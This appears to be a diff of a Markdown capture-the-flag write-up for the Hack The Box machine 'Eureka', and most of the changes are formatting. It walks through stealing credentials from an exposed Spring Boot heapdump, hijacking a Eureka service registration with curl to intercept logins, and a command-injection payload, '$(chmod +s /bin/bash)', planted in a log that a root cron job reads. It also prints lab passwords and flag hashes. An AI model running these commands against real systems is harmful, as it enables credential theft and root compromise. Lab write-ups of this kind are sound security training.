@@ -1,18 +1,18 @@
-# EUREKA
 
-## PORT SCAN
+# PORT SCAN
+---
 
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 80   | HTTP    |
 | 8761 | HTTP    |
 
-## RECONNAISSANCE
 
-***
+
+# RECONNAISSANCE
+---
 
 We need to add `furni.htb` to `/etc/hosts`:
 
@@ -20,11 +20,14 @@ We need to add `furni.htb` to `/etc/hosts`:
 echo '10.10.11.66 furni.htb' | sudo tee -a /etc/hosts
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619141244.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619154412.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619141244.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619154412.png)
+
 
 Port `8761` requires authentication, let's fuzz port 80 to check all functionalities on the web application:
+
 
 ```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://furni.htb/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js
@@ -64,29 +67,31 @@ logout                  [Status: 200, Size: 1159, Words: 117, Lines: 21, Duratio
 
 We can register and we got some functionalities that only work when logged in, let's create a test account:
 
+
 ```
 test1@test.com:test1231234567
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619141634.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619141634.png)
 
 Now we are redirected at a login page, enter your test credentials:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619141809.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619141809.png)
 
 Once we login we get back to the main page, since we already authenticated, we can check the other functionalities, let's do it:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619141903.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619141903.png)
 
 We can try for some vulnerability such as LFI or SQLI, even XSS, before we do that, let's check the `/comment` directory:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619141951.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619141951.png)
 
 Really weird, this is a `404` page but the error message is not the usual one, if we investigate online for the error message, we can find this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619142034.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619142034.png)
 
-Seems like we are dealing with a `Spring Boot` web application, **Spring Boot** is an open-source Java framework designed to simplify the development of stand-alone, production-ready applications. It builds on the Spring Framework by offering a faster and more efficient way to set up and run applications with minimal configuration.
+Seems like we are dealing with a `Spring Boot` web application, **Spring Boot** is an open-source Java framework designed to simplify the development of stand-alone, production-ready applications. It builds on the Spring Framework by offering a faster and more efficient way to set up and run applications with minimal configuration. 
 
 Since we know we are dealing with Spring Boot, a good approach would be checking potential interesting endpoints and even vulnerabilities for this framework.
 
@@ -142,11 +147,14 @@ actuator/beans          [Status: 200, Size: 202253, Words: 913, Lines: 1, Durati
 actuator/threaddump     [Status: 200, Size: 1087199, Words: 5, Lines: 1, Duration: 964ms]
 ```
 
+
 We got a bunch of stuff on here, if we check information on `/actuator/heapdump`, we can find this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619143745.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619143745.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619143822.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619143822.png)
+
 
 This article is pretty useful on how to exploit this misconfiguration:
 
@@ -154,9 +162,9 @@ Article: https://www.wiz.io/blog/spring-boot-actuator-misconfigurations#how-can-
 
 Let's begin exploitation.
 
-## EXPLOITATION
 
-***
+# EXPLOITATION
+---
 
 Let's get our heapdump first:
 
@@ -168,6 +176,7 @@ curl http://furni.htb/actuator/heapdump -O heapdump
 100 76.4M  100 76.4M    0     0  1676k      0  0:00:46  0:00:46 --:--:-- 1636k
 ```
 
+
 Once we have this file, we can analyze it, since this is a binary file, we need to use strings, a good approach is to save the output from strings in a file for a better enumeration of it:
 
 ```
@@ -175,6 +184,7 @@ strings heapdump > heapdump_strings.txt
 ```
 
 Now, here's a nice approach, the file is to big so we would need to grep or do some manual enumeration which ends up being a hassle, due to it, we can find a tool that can do the work for us, in this case, we can use the following tool:
+
 
 PYHPROF: https://github.com/wdahlenburg/pyhprof
 
@@ -228,6 +238,7 @@ User-Agent: Apache-HttpClient/5.3.1 (Java/17.0.11)
 
 There's a bunch of requests made to a `/eureka` endpoint, if we decode the cookie, we get this:
 
+
 ```bash
 _________                        __
 \_   ___ \_______ ___.__._______/  |_ ___.__.___  ___
@@ -260,43 +271,53 @@ Cryptyx > 1
 [+] Decrypted: EurekaSrvr:0scarPWDisTheB3st
 ```
 
+
 We find credentials, we can use these credentials on port `8761` since we know they require authentication:
 
 ```
 EurekaSrvr:0scarPWDisTheB3st
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619154515.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619154534.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619154515.png)
+
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619154534.png)
 
 Now we are able to log into the other web application, we already know this got some endpoints under `/eureka`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619154627.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619154627.png)
 
 Something weird on here is the `Ds Replicas` if we search info on this, we find that, DS Replicas (Discovery Server Replicas) shows the other Eureka nodes that mirror the same in‑memory service registry for high availability. In a multi‑node cluster, each replica pushes and pulls registry updates so if one server goes down, the others still know which services are up.
 
 Let's search for anything related to this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619155151.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619155203.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619155151.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619155203.png)
 
 The `Hacking Netflix Eureka` article seems interesting, let's check it out:
 
 Article: https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619155322.png) ![](gitbook/cybersecurity/images/Pasted%20image%2020250619155339.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619155536.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619155322.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619155339.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619155553.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619155536.png)
+
+
+
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619155553.png)
 
 Based on the article, we can perform SSRF, XSS and traffic hijack, we know that the user is interacting with the web application due to the output from the heapdump, if we are able to hijack the traffic, we may be able to retrieve some credentials.
 
 First of all, let's enumerate the `/eureka/apps` endpoint, when we open it, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619160151.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619160151.png)
 
 This is the full XML:
 
@@ -383,6 +404,7 @@ This is the full XML:
 </applications>
 ```
 
+
 We can parse it to `json` for better visualization:
 
 ```json
@@ -462,9 +484,11 @@ We can parse it to `json` for better visualization:
 }
 ```
 
+
 We can find `USER-MANAGEMENT-SERVICE`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619160927.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619160927.png)
+
 
 We got everything we need to perform the `Hijack`, to understand the flow of the attack, let's follow this diagram I created:
 
@@ -491,18 +515,24 @@ sequenceDiagram
 
 We go through these steps:
 
-* **Reconnaissance**:
-  * Attacker retrieves current service configuration using valid credentials (`EurekaSrvr:0scarPWDisTheB3st`)
-  * Server responds with XML configuration of existing `USER-MANAGEMENT-SERVICE` instance
-* **Instance Hijacking**:
-  * Attacker modifies the XML:
-    * Changes `hostName` to attacker-controlled IP
-    * Alters `port` to malicious service port
-    * Adds custom metadata for attack purposes
-  * Registers malicious instance via POST request with modified XML payload
-* **Cleanup & Takeover**:
-  * Attacker deletes legitimate service instance using its ID (`localhost:USER-MANAGEMENT-SERVICE:8081`)
-  * Eureka server now routes all traffic for `USER-MANAGEMENT-SERVICE` to attacker's instance.
+- **Reconnaissance**:
+    
+    - Attacker retrieves current service configuration using valid credentials (`EurekaSrvr:0scarPWDisTheB3st`)
+    - Server responds with XML configuration of existing `USER-MANAGEMENT-SERVICE` instance
+        
+- **Instance Hijacking**:
+    
+    - Attacker modifies the XML:
+        - Changes `hostName` to attacker-controlled IP
+        - Alters `port` to malicious service port
+        - Adds custom metadata for attack purposes
+    - Registers malicious instance via POST request with modified XML payload
+        
+- **Cleanup & Takeover**:
+
+    - Attacker deletes legitimate service instance using its ID (`localhost:USER-MANAGEMENT-SERVICE:8081`)
+    - Eureka server now routes all traffic for `USER-MANAGEMENT-SERVICE` to attacker's instance.
+
 
 It would basically achieve this:
 
@@ -513,6 +543,7 @@ graph LR
     C --> D[Malicious Actions:<br/> Credential Theft]
 ```
 
+
 After understanding the flow of the attack, we can perform the following curl commands:
 
 ```bash
@@ -521,7 +552,7 @@ curl -u EurekaSrvr:0scarPWDisTheB3st http://furni.htb:8761/eureka/apps/USER-MANA
 
 After getting the configuration, we need to modify both the `hostname` and the `ipAddr` to our vpn IP:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619162353.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619162353.png)
 
 Now, we can register our instance:
 
@@ -563,8 +594,7 @@ curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@furni.htb:8761/eureka/apps/USER
 
 Before sending it, set up a listener on port `8081` and you will receive this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619162916.png)
-
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619162916.png)
 ```http
 nc -lvnp 8081
 Listening on 0.0.0.0 8081
@@ -596,11 +626,13 @@ miranda.wise:IL!veT0Be&BeT0L0ve
 
 Let's go into ssh:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619163212.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619163212.png)
 
 `miranda.wise` does not work, `miranda-wise` works though:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619163302.png)
+
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619163302.png)
 
 So, correct credentials are:
 
@@ -610,21 +642,22 @@ miranda-wise:IL!veT0Be&BeT0L0ve
 
 Let's begin privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+
+# PRIVILEGE ESCALATION
+---
 
 As always, let's use linpeas first:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619163803.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619163803.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619163906.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619163906.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619163916.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619163916.png)
 
 As seen, there's a `log_analyse.sh` file on `opt`, which is pretty weird, let's use `pspy` to check if there's any cronjob related to this file:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619164320.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619164320.png)
 
 As expected, this actually runs as a cronjob in which the file executes in two different logs, let's check the contents of it and if we can modify it:
 
@@ -801,11 +834,12 @@ If we search for info related to `-eq` bash privilege escalation, we can find th
 
 Article: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/bash-eq-privilege-escalation/
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619165746.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619165925.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619165746.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619165937.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619165925.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619165937.png)
 
 We know the script is being run by a cronjob each minutes and it reads from two log files, even if we can modify the script (which we can), the cronjob wouldn't allow us to get a shell as root by doing the simple trick of:
 
@@ -845,13 +879,17 @@ Let's delete the `application.log` and replace it with:
 HTTP Status: a[$(chmod +s /bin/bash)]
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619171046.png)
+
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619171046.png)
+
 
 Now, wait until the cronjob is triggered again and we will be able to get a root shell:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619171149.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619171149.png)
 
 Nice, let's read both flags:
+
 
 ```
 bash-5.0# cat /home/miranda-wise/user.txt
@@ -861,6 +899,10 @@ bash-5.0# cat /root/root.txt
 ebf28efc01adf54e57bf6ee09d451ba6
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250619171340.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250619171340.png)
+
 
 https://www.hackthebox.com/achievement/machine/1872557/658
+
+
